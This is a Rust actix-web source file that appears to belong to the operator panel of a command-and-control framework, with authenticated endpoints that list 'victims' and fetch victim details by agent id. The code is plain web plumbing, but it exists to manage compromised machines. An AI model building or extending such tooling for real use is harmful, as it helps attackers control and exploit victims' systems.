use crate::admin::models::ApiResponse;
use crate::admin::routes::AppState;
use actix_web::{
    get,
    web::{Data, Path},
    HttpRequest, HttpResponse, Responder,
};

#[get("/api/victims")]
pub async fn list_victims(state: Data<AppState>, req: HttpRequest) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    match state.database.get_all_victims() {
        Ok(victims) => {
            log::info!("[+] Retrieved {} victim(s) information", victims.len());
            HttpResponse::Ok().json(victims)
        }
        Err(e) => {
            log::error!("[!] Failed to retrieve victims: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: "Failed to retrieve victims".to_string(),
            })
        }
    }
}

#[get("/api/victim/details/{agent_id}")]
pub async fn get_victim_details(
    state: Data<AppState>,
    agent_id: Path<String>,
    req: HttpRequest,
) -> impl Responder {
    if let Err(e) = state.jwt_manager.authenticate(&req, &state.database) {
        return HttpResponse::Unauthorized().json(ApiResponse {
            success: false,
            message: e.to_string(),
        });
    }

    let agent_id = agent_id.into_inner();

    match state.database.get_victim_details(&agent_id) {
        Ok(Some(info)) => {
            log::info!("[+] Retrieved victim details for agent: {}", agent_id);
            HttpResponse::Ok().json(info)
        }
        Ok(None) => {
            log::warn!("[!] Victim info not found for agent: {}", agent_id);
            HttpResponse::NotFound().json(ApiResponse {
                success: false,
                message: format!("Victim info not found for agent {}", agent_id),
            })
        }
        Err(e) => {
            log::error!("[!] Database error: {}", e);
            HttpResponse::InternalServerError().json(ApiResponse {
                success: false,
                message: "Database error".to_string(),
            })
        }
    }
}
